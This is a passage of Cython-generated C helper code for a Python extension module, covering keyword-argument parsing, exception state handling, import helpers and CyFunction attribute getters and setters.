    Py_DECREF(function);
done:
    return result;
}

/* PyObjectSetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE int __Pyx_PyObject_SetAttrStr(PyObject* obj, PyObject* attr_name, PyObject* value) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_setattro))
        return tp->tp_setattro(obj, attr_name, value);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_setattr))
        return tp->tp_setattr(obj, PyString_AS_STRING(attr_name), value);
#endif
    return PyObject_SetAttr(obj, attr_name, value);
}
#endif

/* PyObjectCallNoArg */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, NULL, 0);
    }
#endif
#if defined(__Pyx_CyFunction_USED) && defined(NDEBUG)
    if (likely(PyCFunction_Check(func) || __Pyx_CyFunction_Check(func)))
#else
    if (likely(PyCFunction_Check(func)))
#endif
    {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_NOARGS)) {
            return __Pyx_PyObject_CallMethO(func, NULL);
        }
    }
    return __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL);
}
#endif

/* JoinPyUnicode */
static PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,
                                      CYTHON_UNUSED Py_UCS4 max_char) {
#if CYTHON_USE_UNICODE_INTERNALS && CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    PyObject *result_uval;
    int result_ukind;
    Py_ssize_t i, char_pos;
    void *result_udata;
#if CYTHON_PEP393_ENABLED
    result_uval = PyUnicode_New(result_ulength, max_char);
    if (unlikely(!result_uval)) return NULL;
    result_ukind = (max_char <= 255) ? PyUnicode_1BYTE_KIND : (max_char <= 65535) ? PyUnicode_2BYTE_KIND : PyUnicode_4BYTE_KIND;
    result_udata = PyUnicode_DATA(result_uval);
#else
    result_uval = PyUnicode_FromUnicode(NULL, result_ulength);
    if (unlikely(!result_uval)) return NULL;
    result_ukind = sizeof(Py_UNICODE);
    result_udata = PyUnicode_AS_UNICODE(result_uval);
#endif
    char_pos = 0;
    for (i=0; i < value_count; i++) {
        int ukind;
        Py_ssize_t ulength;
        void *udata;
        PyObject *uval = PyTuple_GET_ITEM(value_tuple, i);
        if (unlikely(__Pyx_PyUnicode_READY(uval)))
            goto bad;
        ulength = __Pyx_PyUnicode_GET_LENGTH(uval);
        if (unlikely(!ulength))
            continue;
        if (unlikely(char_pos + ulength < 0))
            goto overflow;
        ukind = __Pyx_PyUnicode_KIND(uval);
        udata = __Pyx_PyUnicode_DATA(uval);
        if (!CYTHON_PEP393_ENABLED || ukind == result_ukind) {
            memcpy((char *)result_udata + char_pos * result_ukind, udata, (size_t) (ulength * result_ukind));
        } else {
            #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030300F0 || defined(_PyUnicode_FastCopyCharacters)
            _PyUnicode_FastCopyCharacters(result_uval, char_pos, uval, 0, ulength);
            #else
            Py_ssize_t j;
            for (j=0; j < ulength; j++) {
                Py_UCS4 uchar = __Pyx_PyUnicode_READ(ukind, udata, j);
                __Pyx_PyUnicode_WRITE(result_ukind, result_udata, char_pos+j, uchar);
            }
            #endif
        }
        char_pos += ulength;
    }
    return result_uval;
overflow:
    PyErr_SetString(PyExc_OverflowError, "join() result is too long for a Python string");
bad:
    Py_DECREF(result_uval);
    return NULL;
#else
    result_ulength++;
    value_count++;
    return PyUnicode_Join(__pyx_empty_unicode, value_tuple);
#endif
}

/* RaiseArgTupleInvalid */
static void __Pyx_RaiseArgtupleInvalid(
    const char* func_name,
    int exact,
    Py_ssize_t num_min,
    Py_ssize_t num_max,
    Py_ssize_t num_found)
{
    Py_ssize_t num_expected;
    const char *more_or_less;
    if (num_found < num_min) {
        num_expected = num_min;
        more_or_less = "at least";
    } else {
        num_expected = num_max;
        more_or_less = "at most";
    }
    if (exact) {
        more_or_less = "exactly";
    }
    PyErr_Format(PyExc_TypeError,
                 "%.200s() takes %.8s %" CYTHON_FORMAT_SSIZE_T "d positional argument%.1s (%" CYTHON_FORMAT_SSIZE_T "d given)",
                 func_name, more_or_less, num_expected,
                 (num_expected == 1) ? "" : "s", num_found);
}

/* RaiseDoubleKeywords */
static void __Pyx_RaiseDoubleKeywordsError(
    const char* func_name,
    PyObject* kw_name)
{
    PyErr_Format(PyExc_TypeError,
        #if PY_MAJOR_VERSION >= 3
        "%s() got multiple values for keyword argument '%U'", func_name, kw_name);
        #else
        "%s() got multiple values for keyword argument '%s'", func_name,
        PyString_AsString(kw_name));
        #endif
}

/* ParseKeywords */
static int __Pyx_ParseOptionalKeywords(
    PyObject *kwds,
    PyObject **argnames[],
    PyObject *kwds2,
    PyObject *values[],
    Py_ssize_t num_pos_args,
    const char* function_name)
{
    PyObject *key = 0, *value = 0;
    Py_ssize_t pos = 0;
    PyObject*** name;
    PyObject*** first_kw_arg = argnames + num_pos_args;
    while (PyDict_Next(kwds, &pos, &key, &value)) {
        name = first_kw_arg;
        while (*name && (**name != key)) name++;
        if (*name) {
            values[name-argnames] = value;
            continue;
        }
        name = first_kw_arg;
        #if PY_MAJOR_VERSION < 3
        if (likely(PyString_Check(key))) {
            while (*name) {
                if ((CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**name) == PyString_GET_SIZE(key))
                        && _PyString_Eq(**name, key)) {
                    values[name-argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    if ((**argname == key) || (
                            (CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**argname) == PyString_GET_SIZE(key))
                             && _PyString_Eq(**argname, key))) {
                        goto arg_passed_twice;
                    }
                    argname++;
                }
            }
        } else
        #endif
        if (likely(PyUnicode_Check(key))) {
            while (*name) {
                int cmp = (**name == key) ? 0 :
                #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                    (__Pyx_PyUnicode_GET_LENGTH(**name) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                #endif
                    PyUnicode_Compare(**name, key);
                if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                if (cmp == 0) {
                    values[name-argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    int cmp = (**argname == key) ? 0 :
                    #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                        (__Pyx_PyUnicode_GET_LENGTH(**argname) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                    #endif
                        PyUnicode_Compare(**argname, key);
                    if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                    if (cmp == 0) goto arg_passed_twice;
                    argname++;
                }
            }
        } else
            goto invalid_keyword_type;
        if (kwds2) {
            if (unlikely(PyDict_SetItem(kwds2, key, value))) goto bad;
        } else {
            goto invalid_keyword;
        }
    }
    return 0;
arg_passed_twice:
    __Pyx_RaiseDoubleKeywordsError(function_name, key);
    goto bad;
invalid_keyword_type:
    PyErr_Format(PyExc_TypeError,
        "%.200s() keywords must be strings", function_name);
    goto bad;
invalid_keyword:
    PyErr_Format(PyExc_TypeError,
    #if PY_MAJOR_VERSION < 3
        "%.200s() got an unexpected keyword argument '%.200s'",
        function_name, PyString_AsString(key));
    #else
        "%s() got an unexpected keyword argument '%U'",
        function_name, key);
    #endif
bad:
    return -1;
}

/* GetTopmostException */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem *
__Pyx_PyErr_GetTopmostException(PyThreadState *tstate)
{
    _PyErr_StackItem *exc_info = tstate->exc_info;
    while ((exc_info->exc_type == NULL || exc_info->exc_type == Py_None) &&
           exc_info->previous_item != NULL)
    {
        exc_info = exc_info->previous_item;
    }
    return exc_info;
}
#endif

/* SaveResetException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);
    *type = exc_info->exc_type;
    *value = exc_info->exc_value;
    *tb = exc_info->exc_traceback;
    #else
    *type = tstate->exc_type;
    *value = tstate->exc_value;
    *tb = tstate->exc_traceback;
    #endif
    Py_XINCREF(*type);
    Py_XINCREF(*value);
    Py_XINCREF(*tb);
}
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = type;
    exc_info->exc_value = value;
    exc_info->exc_traceback = tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = type;
    tstate->exc_value = value;
    tstate->exc_traceback = tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
#endif

/* PyErrExceptionMatches */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx_PyErr_ExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        if (__Pyx_PyErr_GivenExceptionMatches(exc_type, PyTuple_GET_ITEM(tuple, i))) return 1;
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err) {
    PyObject *exc_type = tstate->curexc_type;
    if (exc_type == err) return 1;
    if (unlikely(!exc_type)) return 0;
    if (unlikely(PyTuple_Check(err)))
        return __Pyx_PyErr_ExceptionMatchesTuple(exc_type, err);
    return __Pyx_PyErr_GivenExceptionMatches(exc_type, err);
}
#endif

/* GetException */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb)
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb)
#endif
{
    PyObject *local_type, *local_value, *local_tb;
#if CYTHON_FAST_THREAD_STATE
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    local_type = tstate->curexc_type;
    local_value = tstate->curexc_value;
    local_tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
#else
    PyErr_Fetch(&local_type, &local_value, &local_tb);
#endif
    PyErr_NormalizeException(&local_type, &local_value, &local_tb);
#if CYTHON_FAST_THREAD_STATE
    if (unlikely(tstate->curexc_type))
#else
    if (unlikely(PyErr_Occurred()))
#endif
        goto bad;
    #if PY_MAJOR_VERSION >= 3
    if (local_tb) {
        if (unlikely(PyException_SetTraceback(local_value, local_tb) < 0))
            goto bad;
    }
    #endif
    Py_XINCREF(local_tb);
    Py_XINCREF(local_type);
    Py_XINCREF(local_value);
    *type = local_type;
    *value = local_value;
    *tb = local_tb;
#if CYTHON_FAST_THREAD_STATE
    #if CYTHON_USE_EXC_INFO_STACK
    {
        _PyErr_StackItem *exc_info = tstate->exc_info;
        tmp_type = exc_info->exc_type;
        tmp_value = exc_info->exc_value;
        tmp_tb = exc_info->exc_traceback;
        exc_info->exc_type = local_type;
        exc_info->exc_value = local_value;
        exc_info->exc_traceback = local_tb;
    }
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = local_type;
    tstate->exc_value = local_value;
    tstate->exc_traceback = local_tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
#else
    PyErr_SetExcInfo(local_type, local_value, local_tb);
#endif
    return 0;
bad:
    *type = 0;
    *value = 0;
    *tb = 0;
    Py_XDECREF(local_type);
    Py_XDECREF(local_value);
    Py_XDECREF(local_tb);
    return -1;
}

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif

/* SwapException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = *type;
    exc_info->exc_value = *value;
    exc_info->exc_traceback = *tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = *type;
    tstate->exc_value = *value;
    tstate->exc_traceback = *tb;
    #endif
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#else
static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    PyErr_GetExcInfo(&tmp_type, &tmp_value, &tmp_tb);
    PyErr_SetExcInfo(*type, *value, *tb);
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#endif

/* None */
static CYTHON_INLINE void __Pyx_RaiseUnboundLocalError(const char *varname) {
    PyErr_Format(PyExc_UnboundLocalError, "local variable '%s' referenced before assignment", varname);
}

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}

/* ImportFrom */
static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name) {
    PyObject* value = __Pyx_PyObject_GetAttrStr(module, name);
    if (unlikely(!value) && PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Format(PyExc_ImportError,
        #if PY_MAJOR_VERSION < 3
            "cannot import name %.230s", PyString_AS_STRING(name));
        #else
            "cannot import name %S", name);
        #endif
    }
    return value;
}

/* FetchCommonType */
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type) {
    PyObject* fake_module;
    PyTypeObject* cached_type = NULL;
    fake_module = PyImport_AddModule((char*) "_cython_" CYTHON_ABI);
    if (!fake_module) return NULL;
    Py_INCREF(fake_module);
    cached_type = (PyTypeObject*) PyObject_GetAttrString(fake_module, type->tp_name);
    if (cached_type) {
        if (!PyType_Check((PyObject*)cached_type)) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s is not a type object",
                type->tp_name);
            goto bad;
        }
        if (cached_type->tp_basicsize != type->tp_basicsize) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s has the wrong size, try recompiling",
                type->tp_name);
            goto bad;
        }
    } else {
        if (!PyErr_ExceptionMatches(PyExc_AttributeError)) goto bad;
        PyErr_Clear();
        if (PyType_Ready(type) < 0) goto bad;
        if (PyObject_SetAttrString(fake_module, type->tp_name, (PyObject*) type) < 0)
            goto bad;
        Py_INCREF(type);
        cached_type = type;
    }
done:
    Py_DECREF(fake_module);
    return cached_type;
bad:
    Py_XDECREF(cached_type);
    cached_type = NULL;
    goto done;
}

/* CythonFunctionShared */
#include <structmember.h>
static PyObject *
__Pyx_CyFunction_get_doc(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *closure)
{
    if (unlikely(op->func_doc == NULL)) {
        if (op->func.m_ml->ml_doc) {
#if PY_MAJOR_VERSION >= 3
            op->func_doc = PyUnicode_FromString(op->func.m_ml->ml_doc);
#else
            op->func_doc = PyString_FromString(op->func.m_ml->ml_doc);
#endif
            if (unlikely(op->func_doc == NULL))
                return NULL;
        } else {
            Py_INCREF(Py_None);
            return Py_None;
        }
    }
    Py_INCREF(op->func_doc);
    return op->func_doc;
}
static int
__Pyx_CyFunction_set_doc(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp = op->func_doc;
    if (value == NULL) {
        value = Py_None;
    }
    Py_INCREF(value);
    op->func_doc = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_name(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_name == NULL)) {
#if PY_MAJOR_VERSION >= 3
        op->func_name = PyUnicode_InternFromString(op->func.m_ml->ml_name);
#else
        op->func_name = PyString_InternFromString(op->func.m_ml->ml_name);
#endif
        if (unlikely(op->func_name == NULL))
            return NULL;
    }
    Py_INCREF(op->func_name);
    return op->func_name;
}
static int
__Pyx_CyFunction_set_name(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__name__ must be set to a string object");
        return -1;
    }
    tmp = op->func_name;
    Py_INCREF(value);
    op->func_name = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_qualname(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_qualname);
    return op->func_qualname;
}
static int
__Pyx_CyFunction_set_qualname(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__qualname__ must be set to a string object");
        return -1;
    }
    tmp = op->func_qualname;
    Py_INCREF(value);
    op->func_qualname = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_self(__pyx_CyFunctionObject *m, CYTHON_UNUSED void *closure)
{
    PyObject *self;
    self = m->func_closure;
    if (self == NULL)
        self = Py_None;
    Py_INCREF(self);
    return self;
}
static PyObject *
__Pyx_CyFunction_get_dict(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_dict == NULL)) {
        op->func_dict = PyDict_New();
        if (unlikely(op->func_dict == NULL))
            return NULL;
    }
    Py_INCREF(op->func_dict);
    return op->func_dict;
}
static int
__Pyx_CyFunction_set_dict(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
    if (unlikely(value == NULL)) {
        PyErr_SetString(PyExc_TypeError,
               "function's dictionary may not be deleted");
        return -1;
    }
    if (unlikely(!PyDict_Check(value))) {
        PyErr_SetString(PyExc_TypeError,
               "setting function's dictionary to a non-dict");
        return -1;
    }
    tmp = op->func_dict;
    Py_INCREF(value);
    op->func_dict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_globals(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_globals);
    return op->func_globals;
}
static PyObject *
__Pyx_CyFunction_get_closure(CYTHON_UNUSED __pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(Py_None);
    return Py_None;
}
static PyObject *
__Pyx_CyFunction_get_code(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    PyObject* result = (op->func_code) ? op->func_code : Py_None;
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_init_defaults(__pyx_CyFunctionObject *op) {
    int result = 0;
    PyObject *res = op->defaults_getter((PyObject *) op);
    if (unlikely(!res))
        return -1;
    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    op->defaults_tuple = PyTuple_GET_ITEM(res, 0);
    Py_INCREF(op->defaults_tuple);
    op->defaults_kwdict = PyTuple_GET_ITEM(res, 1);
    Py_INCREF(op->defaults_kwdict);
    #else
    op->defaults_tuple = PySequence_ITEM(res, 0);
    if (unlikely(!op->defaults_tuple)) result = -1;
    else {
        op->defaults_kwdict = PySequence_ITEM(res, 1);
        if (unlikely(!op->defaults_kwdict)) result = -1;
    }
    #endif
    Py_DECREF(res);
    return result;
}
static int
__Pyx_CyFunction_set_defaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyTuple_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__defaults__ must be set to a tuple object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_tuple;
    op->defaults_tuple = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_defaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_tuple;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_tuple;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_kwdefaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__kwdefaults__ must be set to a dict object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_kwdict;
    op->defaults_kwdict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_kwdefaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_kwdict;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_kwdict;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_annotations(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value || value == Py_None) {
        value = NULL;
    } else if (!PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__annotations__ must be set to a dict object");
        return -1;
    }
    Py_XINCREF(value);
    tmp = op->func_annotations;
    op->func_annotations = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_annotations(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->func_annotations;
    if (unlikely(!result)) {
        result = PyDict_New();
        if (unlikely(!result)) return NULL;
        op->func_annotations = result;
    }
    Py_INCREF(result);
    return result;
}
static PyGetSetDef __pyx_CyFunction_getsets[] = {
    {(char *) "func_doc", (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "__doc__",  (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "func_name", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__name__", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__qualname__", (getter)__Pyx_CyFunction_get_qualname, (setter)__Pyx_CyFunction_set_qualname, 0, 0},
    {(char *) "__self__", (getter)__Pyx_CyFunction_get_self, 0, 0, 0},
    {(char *) "func_dict", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "__dict__", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "func_globals", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "__globals__", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "func_closure", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "__closure__", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "func_code", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "__code__", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "func_defaults", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__defaults__", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__kwdefaults__", (getter)__Pyx_CyFunction_get_kwdefaults, (setter)__Pyx_CyFunction_set_kwdefaults, 0, 0},
    {(char *) "__annotations__", (getter)__Pyx_CyFunction_get_annotations, (setter)__Pyx_CyFunction_set_annotations, 0, 0},
    {0, 0, 0, 0, 0}
};
static PyMemberDef __pyx_CyFunction_members[] = {
    {(char *) "__module__", T_OBJECT, offsetof(PyCFunctionObject, m_module), PY_WRITE_RESTRICTED, 0},
    {0, 0, 0,  0, 0}
};
static PyObject *
__Pyx_CyFunction_reduce(__pyx_CyFunctionObject *m, CYTHON_UNUSED PyObject *args)
{
#if PY_MAJOR_VERSION >= 3
    Py_INCREF(m->func_qualname);
    return m->func_qualname;
#else
    return PyString_FromString(m->func.m_ml->ml_name);
#endif
}
static PyMethodDef __pyx_CyFunction_methods[] = {
    {"__reduce__", (PyCFunction)__Pyx_CyFunction_reduce, METH_VARARGS, 0},
    {0, 0, 0, 0}
};
#if PY_VERSION_HEX < 0x030500A0
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func_weakreflist)
#else
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func.m_weakreflist)
#endif
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject *op, PyMethodDef *ml, int flags, PyObject* qualname,
                                       PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    if (unlikely(op == NULL))
        return NULL;
    op->flags = flags;
    __Pyx_CyFunction_weakreflist(op) = NULL;
    op->func.m_ml = ml;
    op->func.m_self = (PyObject *) op;
    Py_XINCREF(closure);
    op->func_closure = closure;
    Py_XINCREF(module);
    op->func.m_module = module;
    op->func_dict = NULL;
    op->func_name = NULL;
    Py_INCREF(qualname);
    op->func_qualname = qualname;
    op->func_doc = NULL;
    op->func_classobj = NULL;
    op->func_globals = globals;
    Py_INCREF(op->func_globals);
    Py_XINCREF(code);
    op->func_code = code;
    op->defaults_pyobjects = 0;
    op->defaults_size = 0;
    op->defaults = NULL;
    op->defaults_tuple = NULL;
    op->defaults_kwdict = NULL;
    op->defaults_getter = NULL;
    op->func_annotations = NULL;
    return (PyObject *) op;
}
static int
__Pyx_CyFunction_clear(__pyx_CyFunctionObject *m)
{
    Py_CLEAR(m->func_closure);
    Py_CLEAR(m->func.m_module);
    Py_CLEAR(m->func_dict);
    Py_CLEAR(m->func_name);
    Py_CLEAR(m->func_qualname);
    Py_CLEAR(m->func_doc);
    Py_CLEAR(m->func_globals);
    Py_CLEAR(m->func_code);
    Py_CLEAR(m->func_classobj);
    Py_CLEAR(m->defaults_tuple);
    Py_CLEAR(m->defaults_kwdict);
